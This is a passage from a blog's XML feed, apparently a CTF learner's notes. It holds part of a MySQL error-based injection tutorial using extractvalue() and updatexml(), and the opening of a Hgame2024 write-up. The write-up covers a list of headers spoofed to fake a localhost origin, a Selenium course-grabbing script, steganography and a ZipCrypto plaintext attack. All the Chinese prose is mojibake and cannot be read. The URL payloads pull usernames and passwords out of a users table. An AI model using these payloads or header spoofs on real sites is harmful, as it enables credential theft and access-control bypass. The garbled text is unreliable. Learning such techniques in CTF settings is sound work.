å¯¹åº”å›æ˜¾ï¼Œè€Œè¾“å…¥é”™è¯¯è¯­å¥æ—¶ä»ä¼šæœ‰æŠ¥é”™å›æ˜¾ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°è¯•æŠ¥é”™æ³¨å…¥</p><p>æŠ¥é”™æ³¨å…¥çš„åŸºç¡€æ˜¯åå°å¯¹äºè¾“å…¥è¾“å‡ºçš„åˆç†æ€§æœªåšæ£€æµ‹</p><p>æŠ¥é”™æ³¨å…¥çš„å®ç°å°±æ˜¯æ„é€ è¯­å¥è®©é”™è¯¯è¯­å¥ä¸­å¤¹æ‚å¯ä»¥æ˜¾ç¤ºæ•°æ®åº“å†…å®¹çš„æŸ¥è¯¢è¯­å¥ï¼Œä½¿å¾—è¿”å›çš„æŠ¥é”™æç¤ºä¸­åŒ…å«æ•°æ®åº“ä¸­çš„å†…å®¹</p><h3 id="extractvalue-æŠ¥é”™æ³¨å…¥"><a href="#extractvalue-æŠ¥é”™æ³¨å…¥" class="headerlink" title="extractvalue()æŠ¥é”™æ³¨å…¥"></a>extractvalue()æŠ¥é”™æ³¨å…¥</h3><p>extractvalue()å‡½æ•°åŒ…å«ä¸¤ä¸ªå‚æ•°ï¼šXML æ–‡æ¡£å¯¹è±¡åç§°ã€è·¯å¾„</p><p>æ ¹æ®ä»¥ä¸‹ä¾‹å­äº†è§£è¯¥å‡½æ•°ç”¨æ³•</p><p>1ã€å…ˆåœ¨ ctfstu æ•°æ®åº“å†…åˆ›å»ºè¡¨ xml</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> database ctfstu charset utf8;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> xml(doc <span class="hljs-type">varchar</span>(<span class="hljs-number">150</span>));<br></code></pre></td></tr></table></figure><p>2ã€åœ¨è¡¨å†…æ’å…¥ä¸¤æ®µæ•°æ®</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> xml <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;book&gt;</span><br><span class="hljs-string">&lt;title&gt;A bad boy how to get a</span><br><span class="hljs-string">girlfriend&lt;/title&gt;</span><br><span class="hljs-string">&lt;author&gt;</span><br><span class="hljs-string">&lt;initial&gt;Love&lt;/initial&gt;</span><br><span class="hljs-string">&lt;surname&gt;benben&lt;/surname&gt;</span><br><span class="hljs-string">&lt;/author&gt;</span><br><span class="hljs-string">&lt;/book&gt;</span><br><span class="hljs-string">&#x27;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> xml <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;book&gt;</span><br><span class="hljs-string">&lt;title&gt;how to become a bad boy&lt;/title&gt;</span><br><span class="hljs-string">&lt;author&gt;</span><br><span class="hljs-string">&lt;initial&gt;hualong&lt;/initial&gt;</span><br><span class="hljs-string">&lt;surname&gt;Melton&lt;/surname&gt;</span><br><span class="hljs-string">&lt;/author&gt;</span><br><span class="hljs-string">&lt;/book&gt;</span><br><span class="hljs-string">&#x27;</span>);<br></code></pre></td></tr></table></figure><p>3ã€ä½¿ç”¨ extractValue()æŸ¥è¯¢ xml å†…çš„å†…å®¹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> extractvalue(doc,<span class="hljs-string">&#x27;/book/author/surname&#x27;</span>)<span class="hljs-keyword">from</span> xml;    #æŸ¥è¯¢ä½œè€…<br><br>è¿”å›ï¼š<br>benben<br>Melton<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> extractvalue(doc,<span class="hljs-string">&#x27;/book/title&#x27;</span>)<span class="hljs-keyword">from</span> xml;    #æŸ¥è¯¢ä¹¦å<br><br>è¿”å›ï¼š<br>A bad boy how <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> a girlfried<br>how <span class="hljs-keyword">to</span> become a bad boy<br></code></pre></td></tr></table></figure><p>4ã€å†™é”™æŸ¥è¯¢å‚æ•°ä¸­çš„è·¯å¾„</p><p>ä¾‹å¦‚ <code>select extractvalue(doc,&#39;/book/titlelll&#39;)from xml;</code></p><p>ç»“æœæŸ¥è¯¢ä¸åˆ°å†…å®¹ä½†æ˜¯ä¹Ÿä¸ä¼šæŠ¥é”™</p><p>5ã€å†™é”™æŸ¥è¯¢å‚æ•°çš„æ ¼å¼ç¬¦å·</p><p>ä¾‹å¦‚ <code>select extractvalue(doc,&#39;~book/title&#39;)from xml;</code></p><p>æ˜¾ç¤ºæŠ¥é”™ä¿¡æ¯ <code>#1105 - XPATH syntax error: &#39;~book/title&#39;</code></p><p>è‡³æ­¤æˆ‘ä»¬å‘ç°å½“å†™é”™æŸ¥è¯¢å‚æ•°çš„æ ¼å¼ç¬¦å·æ—¶ä¼šæœ‰æŠ¥é”™è¿”å›ï¼Œæ˜¾ç¤ºæˆ‘ä»¬å†™é”™çš„è·¯å¾„ã€‚å› æ­¤æˆ‘ä»¬æˆ–è®¸å¯ä»¥å°è¯•åœ¨æŠ¥é”™ä¹‹å‰æŸ¥è¯¢æ‰€éœ€ä¿¡æ¯é€šè¿‡æŠ¥é”™è¿”å›æŸ¥çœ‹æŸ¥è¯¢ç»“æœã€‚</p><p>ä¾‹å¦‚ <code>select extractvalue(doc,concat(0x7e,(select database()))) from xml;</code>ï¼Œæ‹¬å·å†…çš„è¯­å¥ <code>select database()</code> ä¼˜å…ˆæ‰§è¡Œï¼Œç„¶åæŸ¥è¯¢ç»“æœé€šè¿‡ <code>concat()</code> å‡½æ•°ä¸ <code>~</code> ç¬¦å·æ‹¼æ¥åœ¨ä¸€èµ·ä½œä¸º <code>extractvalue()</code> å‡½æ•°çš„è·¯å¾„å‚æ•°ï¼Œæœ€åå› ä¸ºæ ¼å¼ä¸ç¬¦è§„èŒƒï¼Œåå°è¿”å›æŠ¥é”™ä¿¡æ¯ï¼Œè€ŒæŠ¥é”™ä¿¡æ¯ä¸­åŒ…å«â€œé”™è¯¯è·¯å¾„â€ä¹Ÿå°±æ˜¯æˆ‘ä»¬æ•…æ„æ„é€ çš„æŸ¥è¯¢è¯­å¥çš„æŸ¥è¯¢ç»“æœã€‚è‡³æ­¤ï¼Œä¸€æ¬¡æŠ¥é”™æ³¨å…¥å®Œæˆã€‚æƒ³è¦æŸ¥è¯¢å…¶ä»–å†…å®¹åªéœ€è¦å°†ç›¸åº”çš„æŸ¥è¯¢è¯­å¥æ›¿æ¢è¿› <code>select database()</code> æ‰€åœ¨ä½ç½®ã€‚</p><p>å®é™…åœ¨è¿ç”¨è¿™ç§æŠ¥é”™æ³¨å…¥æ—¶é€šè¿‡ <code>union select ......</code> æˆ–è€… <code>and 1=......</code> æ³¨å…¥å‡å¯ï¼Œåªè¦æœ€ç»ˆæŠ¥é”™å³å¯</p><p>ä¾‹å¦‚ <code>?id=100&#39; and 1=extractvalue(1,concat(0x7e,(select group_concat(username,&#39;~&#39;,password) from users))) --+</code></p><p>ç„¶è€ŒæŠ¥é”™æ³¨å…¥è¿˜å—åˆ°ä¸€ä¸ªé™åˆ¶ï¼Œ<code>extractvalue()</code> é»˜è®¤åªèƒ½è¿”å› 32 ä¸ªå­—ç¬¦ä¸²ï¼Œæœ‰æ—¶å°±ä¼šæ˜¾ç¤ºä¸å…¨ã€‚å¯¹æ­¤çš„è§£å†³æ–¹æ³•æ˜¯è¿ç”¨ <code>substring(str,num1,num2)</code> å‡½æ•°ï¼Œå…¶ä¸­ str æ˜¯æ“ä½œçš„ç›®æ ‡å­—ç¬¦ä¸²ï¼Œnum1 æ˜¯èµ·å§‹ä½ç½®ï¼Œnum2 æ˜¯æˆªå–ä¸ªæ•°ï¼Œå®ç°çš„æ•ˆæœå°±æ˜¯æ˜¾ç¤ºå­—ç¬¦ä¸² str ä»ç¬¬ num1 ä½èµ· num2 ä¸ªå­—ç¬¦é•¿åº¦çš„å­—ç¬¦ä¸²</p><p>ä¾‹å¦‚ <code>?id=100&#39; and 1=extractvalue(1,concat(0x7e,(select substring(group_concat(username,&#39;~&#39;,password),25,30) from users))) --+</code></p><h3 id="updatexml-æŠ¥é”™æ³¨å…¥"><a href="#updatexml-æŠ¥é”™æ³¨å…¥" class="headerlink" title="updatexml()æŠ¥é”™æ³¨å…¥"></a>updatexml()æŠ¥é”™æ³¨å…¥</h3><p>updatexml()å‡½æ•°åŒ…å«ä¸‰ä¸ªå‚æ•°ï¼šXML æ–‡æ¡£å¯¹è±¡åç§°ã€è·¯å¾„ã€è¦æ›¿æ¢çš„æ–°æ•°æ®</p><p>è¯¥å‡½æ•°çš„åŠŸèƒ½å°±æ˜¯æ›´æ–°æ›¿æ¢ XML æ–‡æ¡£ä¸­çš„æŒ‡å®šå†…å®¹</p><p>è¯¥å‡½æ•°çš„æŠ¥é”™åŸç†ä¸ extractvalue()ä¸€æ ·ï¼Œè¾“å…¥å¸¦é”™è¯¯ç¬¦å·çš„ç¬¬äºŒä¸ªå‚æ•°ã€‚è¯¥å‡½æ•°ä¹ŸåŒæ ·å­˜åœ¨ 32 ä½çš„é™åˆ¶ï¼ŒåŒæ ·å‚è€ƒ extractvalue()ç”¨ substring()è§£å†³</p><h3 id="floor-æŠ¥é”™æ³¨å…¥"><a href="#floor-æŠ¥é”™æ³¨å…¥" class="headerlink" title="floor()æŠ¥é”™æ³¨å…¥"></a>floor()æŠ¥é”™æ³¨å…¥</h3>]]></content>
    
    
    <categories>
      
      <category>Note&amp;Summary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hgame2024 WP</title>
    <link href="/2024/07/03/Hgame2024/"/>
    <url>/2024/07/03/Hgame2024/</url>
    
    <content type="html"><![CDATA[<h1 id="Hgame2024-WP"><a href="#Hgame2024-WP" class="headerlink" title="Hgame2024 WP"></a>Hgame2024 WP</h1><h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="1-Bypass-it"><a href="#1-Bypass-it" class="headerlink" title="1.Bypass it"></a>1.Bypass it</h3><p>ä¸€å¼€å§‹æƒ³åäº†ï¼Œä»¥ä¸ºè¦ç»•è¿‡åˆ«çš„ä»€ä¹ˆï¼Œä½†å…¶å®å°±æ˜¯ç»•è¿‡å¯¹æ³¨å†Œçš„é˜»æ­¢å°±è¡Œï¼ŒæŸ¥çœ‹htmlï¼Œå¯ä»¥çœ‹åˆ°æ³¨å†Œç›¸å…³çš„é¡µé¢åœ°å€ã€‚</p><p><img src="/img/Hgame2024/Week1/1.png"></p><p><img src="/img/Hgame2024/Week1/2.png" alt="register_page.php"></p><p>ç„¶åç›´æ¥å‘register.phpä¼ å‚å°±å¥½äº†<code>username=1&amp;password=1&amp;register=æ³¨å†Œ</code>ã€‚ç„¶åç™»å½•ã€‚</p><h3 id="2-ezHTTP"><a href="#2-ezHTTP" class="headerlink" title="2.ezHTTP"></a>2.ezHTTP</h3><p>å…ˆæ˜¯â€œè¯·ä»vidar.clubè®¿é—®è¿™ä¸ªé¡µé¢â€ï¼Œ<code>Referer=vidar.club</code>å³å¯</p><p>å†æ˜¯â€œè¯·é€šè¿‡Mozilla&#x2F;5.0 (Vidar; VidarOS x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;121.0.0.0 Safari&#x2F;537.36 Edg&#x2F;121.0.0.0è®¿é—®æ­¤é¡µé¢â€ï¼Œ<code>User Agent=Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0</code>å³å¯</p><p>ç„¶åâ€œè¯·ä»æœ¬åœ°è®¿é—®è¿™ä¸ªé¡µé¢â€ï¼Œæˆ‘ç¬¬ä¸€ä¸ªæƒ³åˆ°çš„æ˜¯<code>X-Forwarded-For</code>ï¼Œä½†æ˜¯æ²¡ååº”ï¼Œå‘ç°å“åº”å¤´é‡Œæœ‰æç¤ºâ€œHintï¼šNot XFFâ€ï¼Œæ‰€ä»¥éœ€è¦æ›´æ¢å…¶ä»–ç­‰æ•ˆçš„å­—æ®µï¼Œæœ€ç»ˆ<code>X-Real-IP: 127.0.0.1</code>å¯ä»¥å‘æŒ¥ä½œç”¨ã€‚è¿™é‡Œé™„ä¸Šæ‰€æœ‰èµ·ç±»ä¼¼ä½œç”¨çš„è¯­å¥ï¼ˆåœ¨åšå®¢å›­ä¸€ç¯‡åšå®¢ä¸Šæ‰¾åˆ°çš„ï¼Œå¿˜è®°å…·ä½“å‡ºå¤„äº†ï¼‰</p><pre><code class="hljs">Client-IP:127.0.0.1Forwarded-For-Ip: 127.0.0.1Forwarded-For: 127.0.0.1Forwarded-For: localhostForwarded:127.0.0.1Forwarded: localhostTrue-Client-IP:127.0.0.1X-Client-IP: 127.0.0.1X-Custom-IP-Authorization : 127.0.0.1X-Forward-For: 127.0.0.1X-Forward: 127.0.0.1X-Forward: localhostX-Forwarded-By:127.0.0.1X-Forwarded-By: localhostX-Forwarded-For-Original: 127.0.0.1X-Forwarded-For-original: localhostX-Forwarded-For: 127.0.0.1X-Forwarded-For: localhostX-Forwarded-Server: 127.0.0.1X-Forwarded-Server: localhostX-Forwarded: 127.0.0.1X-Forwarded: localhostX-Forwared-Host: 127.0.0.1X-Forwared-Host: localhostX-Host: 127.0.0.1X-Host: localhostX-HTTP-Host-Override : 127.0.0.1X-Originating-IP: 127.0.0.1X-Real-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1X-Remote-Addr : localhostX-Remote-IP: 127.0.0.1</code></pre><p>äºæ˜¯â€œOk, the flag has been given to you ^-^â€ï¼Œå»çœ‹å“åº”å¤´å‘ç°æœ‰â€œAuthorizationâ€ï¼Œå°†JWTæ”¾åˆ°<a href="https://jwt.io/">https://jwt.io/</a>è§£å¯†å³å¯ã€‚</p><h3 id="3-Select-Courses"><a href="#3-Select-Courses" class="headerlink" title="3.Select Courses"></a>3.Select Courses</h3><p>è¿™é¢˜æˆ‘å½“æ—¶æ²¡åšå‡ºæ¥ï¼Œå°±æ”¾ä¸€ä¸ªå®˜æ–¹é¢˜è§£è®°å½•ä¸€ä¸‹ï¼š</p><hr><p>é¢˜â½¬ä¸»è¦è€ƒå¯Ÿçš„æ˜¯é€‰â¼¿ç¼–å†™è„šæœ¬çš„èƒ½â¼’ã€‚</p><p>å¸®åŠ©é˜¿è‡é€‰åˆ°æ‰€æœ‰è¯¾ç¨‹ï¼Œå³å¯è·å–FLAGã€‚åç«¯é€»è¾‘æ˜¯æ¯é—´éš” 30s-180s æ”¾å‡ºâ¼€â»”è¯¾ï¼Œè‹¥ 5s å†…æ²¡æœ‰é€‰åˆ°è¯¾ç¨‹ï¼Œåˆ™è¯¾ç¨‹â¼œä¼šæ»¡å‘˜ã€‚å·²ç»è¢«é€‰ä¸Šçš„è¯¾ç¨‹ä¸ä¼šå†æ”¾å‡ºã€‚å½“æ‰€æœ‰è¯¾ç¨‹éƒ½é€‰ä¸Šä¹‹åï¼Œç‚¹å‡»â€œé€‰å®Œäº†â€æŒ‰é’®ï¼Œåç«¯åˆ¤å®šæ‰€æœ‰è¯¾ç¨‹éƒ½å·²ç»è¢«é€‰æ‹©ï¼Œå°±ä¼šè¿”å›ç»™å‰ç«¯FLAGã€‚</p><p>é€‰â¼¿å¯ä»¥â¼¿åŠ¨é€‰è¯¾ï¼Œä½†â¼¯ä½œé‡ä¼šâ½è¾ƒâ¼¤ï¼›ä¹Ÿå¯ä»¥é€šè¿‡ç¼–å†™è„šæœ¬æ¥â¾ƒåŠ¨æŠ¢è¯¾ï¼Œâ½å¦‚åŸºäºpythonçš„seleniumç¼–å†™æŠ¢è¯¾è„šæœ¬ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from selenium import webdriver<br>from selenium<span class="hljs-selector-class">.webdriver</span><span class="hljs-selector-class">.common</span><span class="hljs-selector-class">.by</span> import By<br>from selenium<span class="hljs-selector-class">.webdriver</span><span class="hljs-selector-class">.support</span><span class="hljs-selector-class">.ui</span> import WebDriverWait<br>from selenium<span class="hljs-selector-class">.webdriver</span><span class="hljs-selector-class">.support</span> import expected_conditions as EC<br>from <span class="hljs-selector-tag">time</span> import sleep<br><br>driver = webdriver<span class="hljs-selector-class">.Chrome</span>()<br>driver<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&quot;http://127.0.0.1:8000&quot;</span>)<br><span class="hljs-function"><span class="hljs-title">sleep</span><span class="hljs-params">(<span class="hljs-number">3</span>)</span></span><br><br>courses_list = <span class="hljs-selector-attr">[]</span><br><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>):<br>course = &#123;<br><span class="hljs-string">&#x27;panel&#x27;</span>: f<span class="hljs-string">&#x27;//*[@id=&quot;selector-container&quot;]/section[&#123;i&#125;]/div[1]&#x27;</span>,<br><span class="hljs-string">&#x27;status&#x27;</span>: f<span class="hljs-string">&#x27;//*[@id=&quot;selector container&quot;]/section[&#123;i&#125;]/div[2]/table/tbody/tr/td[5]&#x27;</span>,<br><span class="hljs-string">&#x27;submit&#x27;</span>: f<span class="hljs-string">&#x27;//*[@id=&quot;selector container&quot;]/section[&#123;i&#125;]/div[2]/table/tbody/tr/td[6]/button&#x27;</span><br>&#125;<br>courses_list<span class="hljs-selector-class">.append</span>(course)<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(courses_list)</span></span><br><br>while courses_list:<br>driver<span class="hljs-selector-class">.refresh</span>()<br><span class="hljs-built_in">sleep</span>(<span class="hljs-number">2</span>)<br><span class="hljs-keyword">for</span> course <span class="hljs-keyword">in</span> courses_list:<br>panel = driver<span class="hljs-selector-class">.find_element</span>(By<span class="hljs-selector-class">.XPATH</span>, course<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;panel&#x27;</span>]</span>)<br>panel<span class="hljs-selector-class">.click</span>()<br>status_element = driver<span class="hljs-selector-class">.find_element</span>(By<span class="hljs-selector-class">.XPATH</span>, course<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;status&#x27;</span>]</span>)<br>status_text = status_element<span class="hljs-selector-class">.text</span><br><span class="hljs-built_in">print</span>(status_text)<br><span class="hljs-keyword">if</span> status_text != <span class="hljs-string">&quot;å·²æ»¡&quot;</span>:<br>submit_button = driver<span class="hljs-selector-class">.find_element</span>(By<span class="hljs-selector-class">.XPATH</span>, course<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;submit&#x27;</span>]</span>)<br>submit_button<span class="hljs-selector-class">.click</span>()<br><span class="hljs-built_in">WebDriverWait</span>(driver, <span class="hljs-number">5</span>)<span class="hljs-selector-class">.until</span>(EC<span class="hljs-selector-class">.alert_is_present</span>())<br>alert = driver<span class="hljs-selector-class">.switch_to</span><span class="hljs-selector-class">.alert</span><br><br>alert<span class="hljs-selector-class">.accept</span>()<br>courses_list<span class="hljs-selector-class">.remove</span>(course)<br>break<br><br><span class="hljs-function"><span class="hljs-title">sleep</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span><br>driver<span class="hljs-selector-class">.quit</span>()<br></code></pre></td></tr></table></figure><p>åŒæ—¶ï¼Œä¹Ÿå¯ä»¥ç¼–å†™è„šæœ¬æˆ–ä½¿â½¤Burpsuiteç­‰â¼¯å…·æŒç»­å‘åŒ…ï¼Œæ£€æµ‹åˆ°è¿”å›å€¼ä¸º <code>&#123;&#39;full&#39;: 0,&#39;message&#39;: &#39;é€‰è¯¾æˆåŠŸï¼&#39;&#125; </code>å³è¡¨ç¤ºæŠ¢åˆ°æŸé—¨è¯¾ã€‚</p><hr><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="1-æ¥è‡ªæ˜Ÿå°˜çš„é—®å€™"><a href="#1-æ¥è‡ªæ˜Ÿå°˜çš„é—®å€™" class="headerlink" title="1.æ¥è‡ªæ˜Ÿå°˜çš„é—®å€™"></a>1.æ¥è‡ªæ˜Ÿå°˜çš„é—®å€™</h3><p><img src="/img/Hgame2024/Week1/secret.jpg"></p><p>é¢˜ç›®æè¿°é‡Œæåˆ°äº†å…­ä½å¼±åŠ å¯†ï¼Œåº”è¯¥å°±æ˜¯ç”¨çš„steghideç”¨å…­ä½å¯†ç æçš„éšå†™ï¼Œæ‰€ä»¥æ”¾è¿›è„šæœ¬é‡Œåˆ†ç¦»ä¸€ä¸‹ï¼Œçˆ†ç ´å¯†ç ä¹‹å‰è¯•äº†123456ç»“æœç›´æ¥å°±æˆåŠŸäº†ï¼Œè·å¾—äº†éšè—çš„å‹ç¼©åŒ…ï¼Œé‡Œé¢æœ‰ä¸€å¼ å¥‡æ€ªçš„å›¾ç‰‡ã€‚</p><p><img src="/img/Hgame2024/Week1/3.png"></p><p><img src="/img/Hgame2024/Week1/4.png"></p><p>å†æ ¹æ®é¢˜ç›®é‡Œè¯´çš„å®˜ç½‘ä¸Šæ‰¾ç›¸å…³æ–‡å­—ï¼Œå°±å¯ä»¥å»ä¸€ä¸ªä¸ªå¯¹åº”ç¿»è¯‘ã€‚ä½†æ›´æ–¹ä¾¿çš„æ˜¯ç›´æ¥æœç½‘ä¸Šå¯¹è¿™ä¸ªæ–‡å­—çš„åˆ†æã€‚ç„¶ååˆå‘ç°ç½‘ä¸Šæœ‰äººæŒ‡å‡ºå¯ä»¥å»å®˜ç½‘æ‰’woff2æ–‡ä»¶(<a href="https://g.nga.cn/read.php?tid=39109851&amp;rand=99">https://g.nga.cn/read.php?tid=39109851&amp;rand=99</a>)ï¼Œè·Ÿå¤§å°å†™å­—æ¯å’Œæ•°å­—é€ä¸€å¯¹åº”å°±å¥½äº†ã€‚</p><p><img src="/img/Hgame2024/Week1/5.png"></p><h3 id="2-simple-attack"><a href="#2-simple-attack" class="headerlink" title="2.simple_attack"></a>2.simple_attack</h3><p>å‹ç¼©åŒ…è§£å¯†é¢˜ï¼Œé‡Œé¢ä¸€å¼ å›¾ç‰‡åŠ å¦ä¸€ä¸ªå‹ç¼©åŒ…ï¼ŒåŒ…ä¸­åŒ…é‡Œæœ‰ä¸€ä¸ªåŠ å¯†è¿‡çš„è·Ÿå¤–é¢ä¸€æ ·çš„å›¾ç‰‡ï¼ˆæ”¾Bandizipé‡Œçœ‹crcä¸€è‡´ä¸”å‘½åä¸€è‡´ï¼‰å’ŒåŠ å¯†è¿‡çš„txtï¼Œå‹ç¼©ç®—æ³•éƒ½æ˜¯ZipCryptoï¼Œé‚£åŸºæœ¬å°±æ˜¯æ˜æ–‡æ”»å‡»çš„é¢˜å‹äº†ã€‚</p><p><img src="/img/Hgame2024/Week1/6.png" alt="æœ€å¤–å±‚å‹ç¼©åŒ…å†…å®¹"></p><p><img src="/img/Hgame2024/Week1/7.png" alt="å†…å±‚å‹ç¼©åŒ…attachment.zipå†…å®¹"></p><p>æ‰€ä»¥æŠŠå¤–é¢çš„é‚£å¼ æœªåŠ å¯†å›¾ç‰‡æŒ‰å‹ç¼©ç®—æ³•ZipCryptoå‹ç¼©ï¼Œå…¶ä»–é¡¹ä¹Ÿè¦ä¸å‹ç¼©åŒ…å†…åŠ å¯†çš„å›¾ç‰‡ä¸€è‡´ï¼Œå‹ç¼©çº§åˆ«é€ä¸ªè¯•è¿‡æ¥å°±æ˜¯æ­£å¸¸å‹ç¼©ï¼Œç„¶åæ”¾åˆ°ARCHPRé‡Œæ˜æ–‡æ”»å‡»ï¼Œå¾—åˆ°è§£å¯†åçš„attachmentå‹ç¼©åŒ…ã€‚</p><p><img src="/img/Hgame2024/Week1/8.png"></p><p>æ‰“å¼€photo.txté‡Œé¢æ˜¯Data URI schemeçš„æ ¼å¼ï¼Œæ”¾åˆ°æµè§ˆå™¨åœ°å€æ é‡Œå°±å¯ä»¥æŸ¥çœ‹å›¾ç‰‡ï¼Œå¾—åˆ°flagã€‚</p><p><img src="/img/Hgame2024/Week1/9.png"></p><h3 id="3-å¸Œå„¿å¸Œå„¿å¸Œå°”"><a href="#3-å¸Œå„¿å¸Œå„¿å¸Œå°”" class="headerlink" title="3.å¸Œå„¿å¸Œå„¿å¸Œå°”"></a>3.å¸Œå„¿å¸Œå„¿å¸Œå°”</h3><p>æ‹¿åˆ°æ‰‹æ˜¯ä¸€ä¸ªä¸èƒ½æ­£å¸¸æ˜¾ç¤ºçš„å›¾ç‰‡ï¼Œé¢˜ç›®è¯´éœ€è¦ä¿®å¤ï¼Œæ‰€ä»¥åœ¨010Editoræ£€æŸ¥äº†ä¸€ä¸‹ï¼Œå›¾ç‰‡æ ¼å¼æ²¡æœ‰é—®é¢˜ï¼Œä½†åœ¨æœ«å°¾æœ‰secret.txtå’ŒPKï¼Œè¯´æ˜å›¾é‡Œè—æœ‰å‹ç¼©åŒ…ï¼Œç›´æ¥æ”¹äº†æ‹“å±•åï¼Œæ‹¿åˆ°å‹ç¼©åŒ…é‡Œçš„txtæ–‡ä»¶ã€‚ä½†æ²¡æ³•ç›´æ¥è§£å¯†ï¼Œæš‚æ—¶è¿˜ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨ã€‚</p><p><img src="/img/Hgame2024/Week1/10.png"></p><p><img src="/img/Hgame2024/Week1/11.png"></p><p>ç„¶åæƒ³æŠŠå®ƒæ”¾è¿›Stegsolveé‡Œçœ‹çœ‹ï¼Œç»“æœæ‰“ä¸å¼€ï¼Œçœ‹æ¥åº”è¯¥æ˜¯å®½é«˜è¢«ä¿®æ”¹ï¼Œéœ€è¦crcæ ¡éªŒã€‚äºæ˜¯åˆ°pythonè„šæœ¬é‡Œè·‘å‡ºæ­£å¸¸å®½é«˜å¹¶åœ¨010Editorä¿®æ”¹ï¼Œå¾—åˆ°å¸Œå„¿çš„æ­£å¸¸å›¾ç‰‡ã€‚</p><p><img src="/img/Hgame2024/Week1/12.png"></p><p>æ¥ä¸‹æ¥å°±å¯ä»¥åœ¨Stegsolveé‡Œæ­£å¸¸æ‰“å¼€ï¼Œé¡ºä¾¿æ£€æŸ¥äº†ä¸€ä¸‹å±æ€§æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†å‘ç°äº†LSBéšå†™è—ç€å¯ç–‘çš„æ•°æ®ã€‚</p><p><img src="/img/Hgame2024/Week1/13.png"></p><p>å› ä¸ºä¸€å¼€å§‹æ²¡æœ‰å¥½å¥½çœ‹é¢˜ï¼Œç»“æœå§‹ç»ˆä¸çŸ¥é“è¿™ä¸ªåˆ°åº•æ˜¯æ€ä¹ˆç”¨çš„ï¼Œç”šè‡³åæ¥ä»¥ä¸ºè¿™é‡Œåªæ˜¯æˆ‘å¤šæƒ³äº†è½¬è€Œå»å°è¯•å…¶ä»–éšå†™ï¼Œç›´åˆ°æˆ‘åˆçœ‹äº†ä¸€éé¢˜ï¼šé¢˜ç›®åå­—â€œå¸Œå„¿å¸Œå„¿å¸Œå°”â€æœ€åä¸€ä¸ªæ˜¯â€œå¸Œå°”â€ä¸”â€œä¸è¿‡ä»–ä¼¼ä¹å¿˜äº†è¿™ä¸ªåŠ å¯†çš„åå­—ä¸æ˜¯å¸Œå„¿äº†â€ï¼Œä¹Ÿå°±æ˜¯è¯´é¢˜ç›®å·²ç»ç»™å‡ºæç¤ºï¼Œå»ç½‘ä¸Šä¸€æœâ€œå¸Œå°”åŠ å¯†â€è¿˜çœŸæœ‰ï¼Œç„¶ååœ¨<a 